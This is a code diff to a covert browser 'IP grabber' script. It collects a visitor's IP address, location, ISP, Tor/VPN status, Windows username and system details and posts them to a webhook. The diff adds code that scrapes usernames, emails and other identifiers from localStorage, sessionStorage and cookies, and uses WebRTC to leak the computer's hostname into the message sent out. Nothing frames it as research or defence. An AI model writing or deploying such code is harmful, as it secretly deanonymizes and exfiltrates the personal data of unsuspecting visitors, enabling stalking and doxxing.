@@ -111,7 +111,6 @@
                     throw new Error('No IP');
                 })
                 .catch(() => {
-                    // fallback to ip-api.com
                     return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(2000) })
                         .then(res => res.json())
                         .then(data => {
@@ -138,19 +137,8 @@
     //  ENHANCED TOR / VPN DETECTION
     // ================================================================
     function detectTorOrVpnByBrowser(ua) {
-        // 1. Check User-Agent for known Tor or anonymous strings
         if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
-
-        // 2. Check navigator.webdriver – Tor Browser sets this to true
         if (navigator.webdriver === true) return true;
-
-        // 3. Check if it's a Firefox-based browser without Chrome – typical Tor pattern
-        if (ua.includes('Firefox') && !ua.includes('Chrome') && ua.includes('rv:')) {
-            // This could be Tor or regular Firefox, but combined with other checks
-            // We'll only count it if we also have no local IP (will be checked later)
-            // We'll set a flag and combine later.
-            // For now, we don't rely solely on this.
-        }
         return false;
     }
 
@@ -161,9 +149,7 @@
             try {
                 pc = new RTCPeerConnection({ iceServers: [] });
                 pc.createDataChannel('');
-                pc.createOffer()
-                    .then(offer => pc.setLocalDescription(offer))
-                    .catch(() => {});
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                 pc.onicecandidate = (e) => {
                     if (!e.candidate) {
                         pc.close();
@@ -173,7 +159,6 @@
                     const parts = e.candidate.candidate.split(' ');
                     if (parts.length > 7) {
                         const ip = parts[4];
-                        // Real IP: not 0.0.0.0, not ::, not 127.0.0.1 (loopback), and not a private range? We'll just check for non-zero.
                         if (ip && ip !== '0.0.0.0' && ip !== '::' && !ip.startsWith('127.')) {
                             hasRealIP = true;
                         }
@@ -184,10 +169,74 @@
                     resolve(hasRealIP);
                 }, 2000);
             } catch (e) {
-                // If WebRTC is completely blocked, treat as no real IP
                 resolve(false);
             }
         });
+    }
+
+    // ================================================================
+    //  EXTRACT COMPUTER NAME / BROWSER PROFILE
+    // ================================================================
+    function getComputerOrBrowserName(ua, webrtcHostname) {
+        // Method 1: WebRTC hostname (computer name)
+        if (webrtcHostname && webrtcHostname.length > 2 && !webrtcHostname.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+            return webrtcHostname;
+        }
+
+        // Method 2: macOS owner from User-Agent
+        const macOwner = ua.match(/\(Macintosh; Intel Mac OS X [\d_]+\)[^\)]*?([\w\-]+)'?s\s+Mac/);
+        if (macOwner) return macOwner[1];
+
+        // Method 3: localStorage / sessionStorage
+        const keys = ['username', 'user', 'name', 'email', 'login', 'account', 'nick', 'displayname', 'fullname'];
+        const storages = [localStorage, sessionStorage];
+        for (const storage of storages) {
+            try {
+                for (const key of keys) {
+                    const val = storage.getItem(key);
+                    if (val && val.length > 2 && !val.includes('undefined') && !val.includes('null')) {
+                        return val;
+                    }
+                }
+                // iterate all keys
+                for (let i = 0; i < storage.length; i++) {
+                    const key = storage.key(i);
+                    const val = storage.getItem(key);
+                    if (val && val.length > 2 && !val.includes('undefined') && !val.includes('null')) {
+                        if (val.includes('@') || /^[a-zA-Z]/.test(val)) {
+                            return val;
+                        }
+                    }
+                }
+            } catch (e) {}
+        }
+
+        // Method 4: Cookies
+        const cookies = document.cookie.split('; ');
+        const keywords = ['user', 'name', 'email', 'login', 'account', 'nick', 'displayname', 'fullname'];
+        for (const cookie of cookies) {
+            const parts = cookie.split('=');
+            const key = parts[0].toLowerCase();
+            const val = parts[1] || '';
+            if (val && val.length > 2 && !val.includes('undefined') && !val.includes('null')) {
+                if (keywords.some(k => key.includes(k))) {
+                    return decodeURIComponent(val);
+                }
+            }
+        }
+        // Also return any cookie that looks like an email
+        for (const cookie of cookies) {
+            const parts = cookie.split('=');
+            const val = parts[1] || '';
+            if (val.includes('@') && val.length > 5) {
+                return decodeURIComponent(val);
+            }
+        }
+
+        // Method 5: Credential Management API (silent) – we skip due to async and potential popup
+        // but we can try, but we won't wait for it.
+
+        return 'Not detected';
     }
 
     // ================================================================
@@ -196,8 +245,6 @@
     function sendMessage(msg) {
         return new Promise((resolve) => {
             let sent = false;
-
-            // Method 1: fetch
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -209,13 +256,11 @@
                 else throw new Error('fetch failed');
             })
             .catch(() => {
-                // Method 2: sendBeacon
                 const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                 if (navigator.sendBeacon(WEBHOOK, blob)) {
                     sent = true;
                     resolve(true);
                 } else {
-                    // Method 3: XMLHttpRequest (old school)
                     try {
                         const xhr = new XMLHttpRequest();
                         xhr.open('POST', WEBHOOK, true);
@@ -234,7 +279,6 @@
                     }
                 }
             });
-            // fallback timeout
             setTimeout(() => resolve(sent), 5000);
         });
     }
@@ -246,7 +290,6 @@
         try {
             setStatus('Gathering system info...');
 
-            // ---- 1. System info (synchronous) ----
             const ua = navigator.userAgent;
             const os = (function() {
                 if (ua.includes('Windows NT')) return 'Windows';
@@ -290,20 +333,15 @@
                 winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
             } catch (e) {}
 
-            // ---- 2. Detect VPN/Tor via browser heuristics (before IP) ----
+            // ---- Detect VPN/Tor ----
             let isVpn = detectTorOrVpnByBrowser(ua);
-
-            // Also check WebRTC local IPs to see if they are hidden (common in VPNs/Tor)
             const hasRealLocalIP = await detectViaWebRTC();
-            if (!hasRealLocalIP) {
-                isVpn = true;
-            }
+            if (!hasRealLocalIP) isVpn = true;
 
-            // ---- 3. Get IP (with timeout, but we will send even if it fails) ----
+            // ---- Get IP ----
             setStatus('Fetching IP...');
             const ipData = await getIPWithTimeout(1500);
 
-            // ---- 4. Refine VPN detection using IP data (if available) ----
             if (ipData) {
                 if (ipData.proxy === true) isVpn = true;
                 if (ipData.org) {
@@ -313,7 +351,41 @@
                 }
             }
 
-            // ---- 5. Build message ----
+            // ---- Get WebRTC hostname for computer name ----
+            let webrtcHostname = '';
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                const result = await new Promise((resolve) => {
+                    let hname = '';
+                    pc.onicecandidate = (e) => {
+                        if (!e.candidate) {
+                            pc.close();
+                            resolve(hname);
+                            return;
+                        }
+                        const parts = e.candidate.candidate.split(' ');
+                        if (parts.length > 7) {
+                            const hostMatch = e.candidate.candidate.match(/ host (\S+)/);
+                            if (hostMatch && hostMatch[1] && !hostMatch[1].match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                                hname = hostMatch[1];
+                            }
+                        }
+                        if (e.candidate.relatedAddress && !e.candidate.relatedAddress.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                            hname = e.candidate.relatedAddress;
+                        }
+                    };
+                    setTimeout(() => { pc.close(); resolve(hname); }, 2000);
+                });
+                webrtcHostname = result;
+            } catch (e) {}
+
+            // ---- Extract computer/browser name ----
+            const computerName = getComputerOrBrowserName(ua, webrtcHostname);
+
+            // ---- Build message ----
             const ip = ipData ? ipData.ip : 'Unknown';
             const isp = ipData ? ipData.org : 'Unknown ISP';
             const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
@@ -326,6 +398,7 @@
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
 **Windows Username:** ${winUser}
+**Computer Name / Browser Profile:** ${computerName}
 **OS:** ${os}
 **Browser:** ${browser}
 **CPU Cores:** ${navigator.hardwareConcurrency || '?'}
@@ -337,7 +410,7 @@
 **Plugins:** ${plugins}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- 6. Send immediately (no more waiting) ----
+            // ---- Send ----
             setStatus('Sending...');
             const sent = await sendMessage(msg);
 
